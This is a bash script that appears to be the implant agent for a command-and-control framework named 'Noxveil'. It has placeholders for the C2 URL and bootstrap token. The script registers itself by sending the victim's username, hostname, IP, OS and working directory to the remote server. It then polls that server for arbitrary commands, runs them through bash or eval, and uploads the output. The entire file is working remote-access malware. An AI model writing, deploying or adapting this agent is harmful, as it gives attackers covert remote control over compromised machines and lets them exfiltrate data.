#!/usr/bin/env bash

set -uo pipefail

C2_URL="__C2_URL__"
BOOTSTRAP_TOKEN="__AUTH_TOKEN__"
AUTH_TOKEN="$BOOTSTRAP_TOKEN"
AGENT_ID=""
CURRENT_DIR="$(pwd)"
CALLBACK_INTERVAL=3
SILENT=0
MAX_FAIL=10
FAILS=0

while (($# > 0)); do
    case "$1" in
        -s|--silent)
            SILENT=1
            shift
            ;;
        *)
            shift
            ;;
    esac
done

log() {
    if [[ "$SILENT" -eq 0 ]]; then
        printf '[*] %s\n' "$1"
    fi
}

log_error() {
    if [[ "$SILENT" -eq 0 ]]; then
        printf '[!] %s\n' "$1" >&2
    fi
}

looks_like_url() {
    [[ "$1" =~ ^https?://[^[:space:]]+$ ]]
}

looks_like_token() {
    [[ "$1" =~ ^[^.]+\.[^.]+\.[^.]+$ ]]
}

extract_json_field() {
    local payload="$1"
    local field="$2"
    printf '%s' "$payload" | sed -n "s/.*\"${field}\"[[:space:]]*:[[:space:]]*\"\([^\"]*\)\".*/\1/p" | head -n 1
}

extract_json_number() {
    local payload="$1"
    local field="$2"
    printf '%s' "$payload" | sed -n "s/.*\"${field}\"[[:space:]]*:[[:space:]]*\([0-9][0-9]*\).*/\1/p" | head -n 1
}

build_registration_blob() {
    cat <<EOF
user: $(whoami 2>/dev/null || printf 'unknown')
host: $(hostname 2>/dev/null || printf 'unknown')
ip: $(hostname -I 2>/dev/null | awk '{print $1}')
os: $(uname -a 2>/dev/null || printf 'unknown')
pwd: ${CURRENT_DIR}
pid: $$
EOF
}

register_agent() {
    local response
    response="$(curl -fsS -X POST "${C2_URL}/api/v1/reg" \
        -H "Authorization: Bearer ${BOOTSTRAP_TOKEN}" \
        -H "Content-Type: text/plain" \
        --data-binary "$(build_registration_blob)" \
        --max-time 15)" || return 1

    AGENT_ID="$(extract_json_field "$response" "agent_id")"
    AUTH_TOKEN="$(extract_json_field "$response" "agent_token")"
    local next_interval
    next_interval="$(extract_json_number "$response" "callback_interval")"
    if [[ -n "$next_interval" ]]; then
        CALLBACK_INTERVAL="$next_interval"
    fi

    if [[ -z "$AGENT_ID" || -z "$AUTH_TOKEN" ]]; then
        log_error "Interactive registration failed to return agent credentials"
        return 1
    fi

    log "Registered interactive agent ${AGENT_ID}"
    return 0
}

poll_command() {
    curl -fsS "${C2_URL}/api/v1/cmd" \
        -H "Authorization: Bearer ${AUTH_TOKEN}" \
        --max-time 30
}

submit_output() {
    local output="$1"
    curl -fsS -X POST "${C2_URL}/api/v1/out" \
        -H "Authorization: Bearer ${AUTH_TOKEN}" \
        -H "Content-Type: text/plain" \
        --data-binary "$output" \
        --max-time 20 >/dev/null 2>&1
}

run_command() {
    local command="$1"
    local output=""

    if [[ "$command" == "__EXIT__" ]]; then
        log "Received exit command"
        exit 0
    fi

    if [[ "$command" == cd\ * ]]; then
        local target_dir="${command#cd }"
        if cd "$target_dir" 2>/dev/null; then
            CURRENT_DIR="$(pwd)"
            output="[+] Changed to: ${CURRENT_DIR}"
        else
            output="[-] cd: cannot access '${target_dir}'"
        fi
        submit_output "$output"
        return
    fi

    if [[ "$command" == export\ * ]]; then
        eval "$command" 2>/dev/null
        submit_output "[+] Exported: ${command}"
        return
    fi

    local exit_code=0
    if command -v timeout >/dev/null 2>&1; then
        output="$(cd "$CURRENT_DIR" && timeout 30 bash -lc "$command" 2>&1)" || exit_code=$?
    else
        output="$(cd "$CURRENT_DIR" && bash -lc "$command" 2>&1)" || exit_code=$?
    fi

    if [[ -z "$output" ]]; then
        output="[+] (no output)"
    elif [[ "$exit_code" -ne 0 ]]; then
        output="[-] ${output}"
    fi

    submit_output "$output"
}

main() {
    if ! looks_like_url "$C2_URL"; then
        log_error "Provide a valid Noxveil URL with --url or an embedded payload URL"
        exit 1
    fi

    if ! looks_like_token "$BOOTSTRAP_TOKEN"; then
        log_error "Provide a valid bootstrap token with --token or an embedded payload token"
        exit 1
    fi

    register_agent || {
        log_error "Cannot reach interactive Noxveil. Exiting."
        exit 1
    }

    while true; do
        local cmd
        cmd="$(poll_command)" || {
            FAILS=$((FAILS + 1))
            if [[ "$FAILS" -ge "$MAX_FAIL" ]]; then
                log_error "Too many polling failures. Exiting."
                exit 1
            fi
            sleep 2
            continue
        }

        FAILS=0
        if [[ -z "$cmd" || "$cmd" == "__NOP__" ]]; then
            sleep "$CALLBACK_INTERVAL"
            continue
        fi

        run_command "$cmd"
        sleep "$CALLBACK_INTERVAL"
    done
}

trap 'log "Interactive agent shutting down"; exit 0' INT TERM
main
